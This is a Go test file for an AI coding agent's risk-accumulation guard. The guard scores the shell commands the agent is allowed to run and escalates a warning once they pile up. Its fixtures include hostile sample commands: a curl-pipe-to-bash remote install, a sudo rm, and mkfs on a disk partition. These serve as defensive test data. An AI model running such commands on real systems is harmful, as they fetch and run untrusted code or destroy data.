package tool

import (
	"strings"
	"sync"
	"testing"

	"github.com/topcheer/ggcode/internal/permission"
)

// r28: Allowed-Risk Accumulation Guard (DreamGuard-inspired dual of the
// SecurityLedger). Dangerous-command samples are drawn from the live
// DangerousDetector pattern table (dangerous.go), not re-implemented here.

const (
	smpHigh     = "sudo rm /tmp/leftover-build"        // sudo rm -> DangerHigh
	smpMedium   = "curl https://get.example.sh | bash" // curl|bash -> DangerMedium
	smpCritical = "mkfs.ext4 /dev/sda2"                // mkfs -> DangerCritical
	smpSafe     = "ls -la /tmp"                        // not classified
)

// Safe commands never score; a session of them stays silent.
func TestAllowedRiskLedger_SafeCommandsInert(t *testing.T) {
	l := NewAllowedRiskLedger()
	for i := 0; i < 10; i++ {
		l.Accumulate(smpSafe)
	}
	if l.Score() != 0 || len(l.Events()) != 0 {
		t.Fatalf("safe commands must not accumulate: score=%v events=%d", l.Score(), len(l.Events()))
	}
	if l.Escalation() != "" {
		t.Fatal("no accumulation = no escalation")
	}
}

// Score weights: medium 1, high 3, critical 4.
func TestAllowedRiskLedger_ScoreWeights(t *testing.T) {
	l := NewAllowedRiskLedger()
	l.Accumulate(smpMedium)
	l.Accumulate(smpHigh)
	l.Accumulate(smpCritical)
	if want := riskScoreMedium + riskScoreHigh + riskScoreCritical; l.Score() != want {
		t.Fatalf("score = %v, want %v", l.Score(), want)
	}
	if len(l.Events()) != 3 {
		t.Fatalf("events = %d, want 3", len(l.Events()))
	}
}

// ~8 medium commands (score threshold) escalates exactly once; the warning
// names the drift pattern and recent commands.
func TestAllowedRiskLedger_MediumDriftEscalates(t *testing.T) {
	l := NewAllowedRiskLedger()
	for i := 0; i < int(riskScoreThreshold); i++ {
		l.Accumulate(smpMedium)
	}
	esc := l.Escalation()
	if esc == "" {
		t.Fatal("8 medium-risk commands must escalate")
	}
	if !strings.Contains(esc, "RISK ACCUMULATION") || !strings.Contains(esc, smpMedium) {
		t.Errorf("escalation must name the pattern and a recent command:\n%s", esc)
	}
	if l.Escalation() != "" {
		t.Fatal("escalation must fire once per crossing (drain semantics)")
	}
}

// Three high commands (score 9 >= 8) escalates.
func TestAllowedRiskLedger_HighTripletEscalates(t *testing.T) {
	l := NewAllowedRiskLedger()
	l.Accumulate(smpHigh)
	l.Accumulate(smpHigh)
	if l.Escalation() != "" {
		t.Fatal("two high (score 6) below threshold must stay silent")
	}
	l.Accumulate(smpHigh)
	if l.Escalation() == "" {
		t.Fatal("three high (score 9) must escalate")
	}
}

// Two critical (score 8) escalates - critical commands are individually
// close to the hazard line.
func TestAllowedRiskLedger_CriticalPairEscalates(t *testing.T) {
	l := NewAllowedRiskLedger()
	l.Accumulate(smpCritical)
	l.Accumulate(smpCritical)
	if l.Escalation() == "" {
		t.Fatal("two critical (score 8) must escalate")
	}
}

// Same-class drift: 5 mediums (score 5 < 8) escalates on class count.
func TestAllowedRiskLedger_ClassCountEscalatesBelowScore(t *testing.T) {
	l := NewAllowedRiskLedger()
	for i := 0; i < riskClassThreshold-1; i++ {
		l.Accumulate(smpMedium)
	}
	if l.Escalation() != "" {
		t.Fatal("4 same-class below both thresholds must stay silent")
	}
	l.Accumulate(smpMedium)
	if l.Escalation() == "" {
		t.Fatal("5 same-class (class threshold) must escalate even below score threshold")
	}
}

// Escalations are capped per session.
func TestAllowedRiskLedger_WarningCap(t *testing.T) {
	l := NewAllowedRiskLedger()
	fired := 0
	for i := 0; i < 40; i++ {
		l.Accumulate(smpHigh)
		if l.Escalation() != "" {
			fired++
		}
	}
	if fired != maxRiskWarnings {
		t.Fatalf("escalations fired %d times, want cap %d", fired, maxRiskWarnings)
	}
}

// Nil receiver is inert everywhere (unwired = no detection).
func TestAllowedRiskLedger_NilSafe(t *testing.T) {
	var l *AllowedRiskLedger
	l.Accumulate(smpHigh)
	if l.Escalation() != "" || l.Score() != 0 || l.Events() != nil {
		t.Fatal("nil ledger must be inert")
	}
}

// Event cap bounds memory under a runaway loop.
func TestAllowedRiskLedger_EventCap(t *testing.T) {
	l := NewAllowedRiskLedger()
	for i := 0; i < maxRiskEvents+50; i++ {
		l.Accumulate(smpMedium)
	}
	if len(l.Events()) > maxRiskEvents {
		t.Fatalf("events = %d, cap %d exceeded", len(l.Events()), maxRiskEvents)
	}
}

// Events carry the detector's classification for observability.
func TestAllowedRiskLedger_EventCarriesLevel(t *testing.T) {
	l := NewAllowedRiskLedger()
	l.Accumulate(smpHigh)
	evs := l.Events()
	if len(evs) != 1 || evs[0].Level != permission.DangerHigh || evs[0].Reason == "" {
		t.Fatalf("event must carry level+reason: %+v", evs)
	}
}

// Concurrent Accumulate/Escalation must be race-free (wired on the tool
// execution path, shared across parallel tool calls).
func TestAllowedRiskLedger_ConcurrentAccess(t *testing.T) {
	l := NewAllowedRiskLedger()
	var wg sync.WaitGroup
	for i := 0; i < 8; i++ {
		wg.Add(2)
		go func() { defer wg.Done(); l.Accumulate(smpMedium) }()
		go func() { defer wg.Done(); _ = l.Escalation() }()
	}
	wg.Wait()
	if len(l.Events()) != 8 {
		t.Fatalf("events = %d, want 8", len(l.Events()))
	}
}
